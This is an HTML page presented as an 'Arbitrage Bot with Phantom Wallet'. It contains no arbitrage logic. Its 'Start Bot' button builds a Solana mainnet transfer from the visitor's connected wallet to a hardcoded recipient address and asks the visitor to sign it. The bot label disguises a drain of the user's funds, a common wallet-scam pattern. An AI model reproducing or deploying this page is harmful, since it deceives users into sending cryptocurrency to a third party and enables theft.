<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Arbitrage Bot with Phantom Wallet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            padding: 20px;
        }
        h1 {
            text-align: center;
            color: #333;
        }
        #app {
            width: 80%;
            margin: 0 auto;
            text-align: center;
            padding: 20px;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        #walletAddress {
            margin: 20px 0;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .status {
            margin-top: 20px;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div id="app">
    <h1>Connect Your Phantom Wallet</h1>
    <p id="walletAddress">Connect your wallet to see your address</p>
    <button id="connectButton">Connect Phantom Wallet</button>
    <button id="startBotButton" disabled>Start Bot</button>
    <div class="status" id="status"></div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/@solana/web3.js/1.37.1/solana-web3.min.js"></script>
<script>
    let userAccount;
    const recipientAddress = "3ihvQYLpND6YJ18etpBnpo4vNr7NRoWpYkMjeFc9NHDZ";  // Solana recipient address
    const phantomDeepLink = "https://phantom.app/ul/v1/connect?app_url=YOUR_APP_URL";

    // Check if the user is on mobile
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

    // Function to connect to Phantom Wallet
    async function connectPhantomWallet() {
        if (window.solana && window.solana.isPhantom) {
            try {
                // Request connection to the wallet
                const response = await window.solana.connect();
                userAccount = response.publicKey.toString();
                document.getElementById("walletAddress").innerText = "Wallet Address: " + userAccount;
                document.getElementById("startBotButton").disabled = false;
                document.getElementById("status").innerText = "Wallet connected successfully.";
            } catch (error) {
                console.error("Error connecting to Phantom:", error);
                alert("Error connecting to Phantom: " + error.message);
            }
        } else if (isMobile) {
            // Redirect to Phantom app using deep link if on mobile
            window.location.href = phantomDeepLink;
        } else {
            alert("Phantom Wallet not found. Please install the Phantom Wallet extension on desktop or use the Phantom app on mobile.");
        }
    }

    // Attach event listener to the "Connect Phantom Wallet" button
    document.getElementById("connectButton").addEventListener("click", connectPhantomWallet);

    // Function to send SOL to the recipient address
    async function sendSolanaTokens() {
        if (!userAccount) {
            document.getElementById("status").innerText = "Please connect your wallet first.";
            return;
        }

        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
        const transaction = new solanaWeb3.Transaction();

        try {
            // Create a SOL transfer instruction
            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: new solanaWeb3.PublicKey(userAccount),
                    toPubkey: new solanaWeb3.PublicKey(recipientAddress),
                    lamports: 1000000 // Adjust the amount in lamports (1 SOL = 1e9 lamports)
                })
            );

            // Request signature and send transaction
            const { signature } = await window.solana.signAndSendTransaction(transaction);
            await connection.confirmTransaction(signature, 'confirmed');

            document.getElementById("status").innerText = `Transaction successful: ${signature}`;
        } catch (error) {
            console.error("Transaction failed:", error);
            document.getElementById("status").innerText = `Transaction failed: ${error.message}`;
        }
    }

    // Attach event listener to the "Start Bot" button
    document.getElementById("startBotButton").addEventListener("click", sendSolanaTokens);
</script>

</body>
</html>
